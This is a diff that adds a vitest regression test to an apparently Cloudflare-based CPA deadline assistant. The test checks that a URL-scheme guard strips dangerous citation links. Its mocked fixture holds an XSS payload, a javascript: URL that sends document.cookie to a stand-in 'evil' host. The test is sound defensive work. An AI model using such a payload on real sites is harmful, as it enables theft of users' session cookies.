@@ -10,7 +10,7 @@
  *      trusting the allowlist code looks right.
  */
 import { env, SELF } from "cloudflare:test";
-import { describe, expect, it } from "vitest";
+import { describe, expect, it, vi } from "vitest";
 import { resolvedNextDeadlineComputed, type CpaRecord } from "../src/deadline";
 import cpaDeadlinesData from "../src/cpa_deadlines.json";
 
@@ -233,5 +233,45 @@ describe("rate limiting -- shared 'assistant_api' bucket across all six routes",
   it("a fresh IP is unaffected by another IP's exhausted bucket", async () => {
     const resp = await getAssistant("/api/assistant/cpe?state=texas", "203.0.113.99");
     expect(resp.status).toBe(200);
+  });
+});
+
+// TEST-11 (AuditLab, 2026-09-19): XSS-2's fix (all 5 lookupAssistant*
+// functions wrapping citation_url in safeHttpUrl()) shipped with no test
+// that would fail if any one of those 5 wraps were reverted -- the real
+// bundled data is 100% http(s) already, so every existing test above
+// passes regardless of whether the guard runs. Real, injected bad data
+// is the only way to prove the guard is load-bearing, same technique
+// mobility.spec.ts:873 already uses for normalizeRuleRow's identical guard.
+describe("XSS-2 regression -- citation_url scheme guard is load-bearing, not just currently unneeded", () => {
+  it("lookupAssistantCpe nulls a javascript: citation_url instead of passing it through", async () => {
+    vi.resetModules();
+    vi.doMock("../src/cpe_hours.json", () => ({
+      default: {
+        records: [
+          {
+            id: "xx-cpe",
+            state: "Test State",
+            state_slug: "xx-test-state",
+            total_hours: 80,
+            period_years: 2,
+            annual_minimum_hours: null,
+            ethics_hours: 4,
+            ethics_period_years: 2,
+            notes: "fixture",
+            data_gap_note: null,
+            citation: "Test Code s 1",
+            citation_url: "javascript:fetch('https://evil/'+document.cookie)",
+            verified_date: "2026-01-01",
+          },
+        ],
+      },
+    }));
+    const { lookupAssistantCpe } = await import("../src/assistant");
+    const result = lookupAssistantCpe("xx-test-state");
+    expect(result).not.toBeNull();
+    expect(result!.citation_url).toBeNull();
+    vi.doUnmock("../src/cpe_hours.json");
+    vi.resetModules();
   });
 });
